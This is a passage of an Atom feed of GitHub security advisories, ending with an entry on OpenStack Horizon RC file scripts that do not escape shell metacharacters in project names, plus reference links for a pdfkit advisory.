<li><a href="https://habuon.github.io/2025/03/12/pdfkit-vulnerability-%28CVE-2025-26240%29.html">https://habuon.github.io/2025/03/12/pdfkit-vulnerability-%28CVE-2025-26240%29.html</a></li>
<li><a href="https://www.csirt.gov.sk/the-python-pdfkit-library-vulnerability.html">https://www.csirt.gov.sk/the-python-pdfkit-library-vulnerability.html</a></li>
<li><a href="https://github.com/advisories/GHSA-9g3x-6x24-vf9f">https://github.com/advisories/GHSA-9g3x-6x24-vf9f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9g3x-6x24-vf9f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-17T18:35:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[horizon] OpenStack Horizon RC file generation does not escape special characters in project names]]></title>
        <id>https://github.com/advisories/GHSA-6wrm-x65g-hr4p</id>
        <link href="https://github.com/advisories/GHSA-6wrm-x65g-hr4p"/>
        <updated>2026-06-18T14:37:29.000Z</updated>
        <content type="html"><![CDATA[<p>OpenStack Horizon before 25.7.4 produces scripts for OpenStack RC file downloading that may have a crafted project name with shell metacharacters. NOTE: some parties consider this a security hardening opportunity to address certain types of user error, not a vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55748">https://nvd.nist.gov/vuln/detail/CVE-2026-55748</a></li>
<li><a href="https://launchpad.net/bugs/2152240">https://launchpad.net/bugs/2152240</a></li>
<li><a href="https://wiki.openstack.org/wiki/OSSN/OSSN-0097">https://wiki.openstack.org/wiki/OSSN/OSSN-0097</a></li>
<li><a href="https://github.com/advisories/GHSA-6wrm-x65g-hr4p">https://github.com/advisories/GHSA-6wrm-x65g-hr4p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6wrm-x65g-hr4p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-17T18:35:56.000Z</published>
    </entry>
</feed>